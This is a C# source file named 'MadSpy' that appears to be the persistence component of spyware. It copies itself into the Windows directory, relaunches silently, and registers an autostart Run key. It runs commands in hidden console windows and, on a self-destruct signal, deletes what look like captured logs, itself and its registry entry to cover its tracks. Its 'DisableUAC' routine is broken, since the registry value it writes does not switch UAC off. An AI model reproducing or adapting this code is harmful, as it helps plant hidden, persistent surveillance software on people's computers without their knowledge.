using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace MadSpy
{
    class Injector
    {
        public static void Inject(Data data) 
        {
            while (true)
            {
                Thread.Sleep(1000);

                Assembly currentAssembly = Assembly.GetExecutingAssembly();

                string agent;
                lock (Program.DATALOCK)
                {
                    agent = data.Agent;
                }

                if (agent.ToUpper().Equals("MADSPY")) 
                    continue;

                lock (Program.DATALOCK)
                {
                    DisableUAC(data);
                }

                string saveAsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\" + agent + @"\";
                string saveAsName = saveAsDirectory + agent + ".exe";

                FileInfo fileInfoOutputFile = new FileInfo(saveAsName);

                if (!fileInfoOutputFile.Exists)
                {
                    Directory.CreateDirectory(saveAsDirectory);
                    Cmd("move \"" + Application.ExecutablePath + "\" \"" + saveAsName + "\"");

                    ProcessStartInfo psi = new ProcessStartInfo(saveAsName);
                    Process.Start(psi);

                    lock (Program.DATALOCK)
                    {
                        Regedit(data);

                        System.Environment.Exit(0);
                    }
                }
                else
                {
                    lock (Program.DATALOCK)
                    {
                        Regedit(data);
                    }

                    if (data.Status == Status.Selfdestroy)
                    {
                        Cmd("del \"" + Path.GetTempPath() + "\\log.txt\"");
                        Cmd("del \"" + Path.GetTempPath() + "\\img.html\"");
                        Cmd("del \"" + Application.ExecutablePath + "\"");
                        Cmd("rmdir /s /q \"" + Assembly.GetEntryAssembly().Location + "\"");

                        System.Environment.Exit(0);
                    }
                }
            }
        }

        private static void Regedit(Data data)
        {
            try
            {
                RegistryKey startupKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (data.Status != Status.Selfdestroy)
                {
                    startupKey.SetValue(data.Agent, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\" + data.Agent + @"\" + data.Agent + ".exe");
                    startupKey.Close();
                }
                else
                {
                    startupKey.DeleteValue(data.Agent, false);
                    startupKey.Close();
                }
            }
            catch (Exception e) 
            { 
            }
        }

        private static void DisableUAC(Data data) 
        {
            try
            {
                RegistryKey uac = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                if (uac == null)
                {
                    uac = Registry.CurrentUser.CreateSubKey(("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
                }
                uac.SetValue("EnableLUA", 1);
                uac.Close();
            }
            catch (Exception e) 
            { 
            }
        }

        private static void Cmd(string command) 
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", String.Format("/k {0} & {1} & {2}", "timeout /T 1 /NOBREAK >NUL", @command, "exit"));
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            Process.Start(psi);
        }
    }
}
